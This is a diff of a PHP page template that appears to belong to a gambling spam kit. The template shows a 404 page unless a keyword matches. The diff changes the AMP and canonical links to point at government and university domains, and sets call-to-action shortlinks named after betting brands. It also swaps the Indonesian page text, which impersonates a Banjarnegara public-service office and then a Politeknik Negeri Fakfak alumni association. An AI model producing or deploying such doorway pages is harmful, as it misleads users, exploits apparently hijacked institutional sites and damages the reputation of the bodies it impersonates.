@@ -43,15 +43,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://needmariju.top/page/$dashbrand";
-$canonical = "https://kel-semarang.banjarnegarakab.go.id/page/?post=$dashbrand";
-$cta = "https://t.ly/betboss";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729082465/OIG3.D6yR1W8ZA.yDN4Nj16Ew_1_kmawfn.jpg";
+$amphtml = "https://tamuramah.site/id/$dashbrand";
+$canonical = "https://isaintek.polinef.ac.id/js/$dashbrand";
+$cta = "https://t.ly/betserulink";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729350835/OIG4.K6JdhVT7LlFvAwCx2ztK_rf7rsw.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Kabupaten Banjarnegara Kelurahan Semarang";
-$desc = "Lembaga disetiap daerah memiliki fungsi dan tugasnya masing-masing dengan salah satu contoh di kota Semarang yakni di Kabupaten Banjarnegara yang memiliki sebuah layanan publik secara online di $namabrand untuk masyarkat agar lebih mudah dijangkau setiap keluhan atau kendala yang dimiliki masyarkat melalui link alternatif.";
-$konten = "Lembaga disetiap daerah memiliki fungsi dan tugasnya masing-masing dengan salah satu contoh di kota Semarang yakni di Kabupaten Banjarnegara yang memiliki sebuah layanan publik secara online di $namabrand untuk masyarkat agar lebih mudah dijangkau setiap keluhan atau kendala yang dimiliki masyarkat melalui link alternatif.";
+$judul = "$namabrand Perkumpulan Solidaritas Alumni SPR Polinef";
+$desc = "Perkumpulan Solidaritas Alumni SPR Polinef adalah sebuah organisasi yang dibentuk oleh $namabrand para lulusan Sekolah Pendidikan Rakyat (SPR) dari Politeknik Negeri Fakfak (Polinef). Tujuan utama dari perkumpulan ini adalah untuk menjaga tali silaturahmi di antara para alumni serta mendukung pengembangan jaringan profesional di berbagai bidang.";
+$konten = "Perkumpulan Solidaritas Alumni SPR Polinef adalah sebuah organisasi yang dibentuk oleh $namabrand para lulusan Sekolah Pendidikan Rakyat (SPR) dari Politeknik Negeri Fakfak (Polinef). Tujuan utama dari perkumpulan ini adalah untuk menjaga tali silaturahmi di antara para alumni serta mendukung pengembangan jaringan profesional di berbagai bidang.";
 ?>
 
 
